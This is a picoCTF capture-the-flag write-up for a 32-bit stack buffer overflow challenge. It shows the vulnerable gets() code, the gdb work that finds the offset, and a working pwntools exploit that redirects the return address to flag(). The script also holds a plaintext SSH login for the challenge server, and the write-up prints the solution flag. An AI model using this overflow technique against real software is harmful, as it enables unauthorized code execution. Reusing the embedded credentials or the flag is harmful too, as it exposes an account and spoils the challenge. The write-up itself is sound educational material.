# Problem
You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this [program](https://2019shell1.picoctf.com/static/f91a5df8cf50ebba23f22d7c735b2a21/vuln)? You can find it in /problems/overflow-1_2_305519bf80dcdebd46c8950854760999 on the shell server. [Source](https://2019shell1.picoctf.com/static/f91a5df8cf50ebba23f22d7c735b2a21/vuln.c).

## Hints:
Take control that return address

Make sure your address is in Little Endian.

## Solution:

Lets download the files:
```bash
wget https://2019shell1.picoctf.com/static/f91a5df8cf50ebba23f22d7c735b2a21/vuln
wget https://2019shell1.picoctf.com/static/f91a5df8cf50ebba23f22d7c735b2a21/vuln.c
```

First, we investigate the source
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf("Woah, were jumping to 0x%x !\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Give me a string and lets see what happens: ");
  vuln();
  return 0;
}
```

The call to ```gets()``` in ```vuln()``` is unsafe, there is no limit checking.

We can override the return address and jump to ```flag()```.

First we need to check the offset overriding the return address. We can use this gdbinit script
```
run < <(echo AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ)
```

Lets debug:
```bash
gdb -x ./gdbinit ./vuln

Stopped reason: SIGSEGV
0x54545454 in ?? ()
```

We know that ```TTTT``` overrides the return address.

Now lets write a simple python script:
```python
#!/usr/bin/env python

from pwn import *


debug = 0

user = 'RoeeSefi'
pw = 'UTTE9CQN2idX28W'

if debug:
  p = process('./vuln')
else:
  s = ssh(host = '2019shell1.picoctf.com', user=user, password=pw)
  s.set_working_directory('/problems/overflow-1_2_305519bf80dcdebd46c8950854760999')
  p = s.process('./vuln')

binary = ELF('./vuln')

print p.recvuntil('happens:')
p.sendline('AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS' + p32(binary.symbols['flag']))
print p.recvall()
```

Flag: picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a32b9368}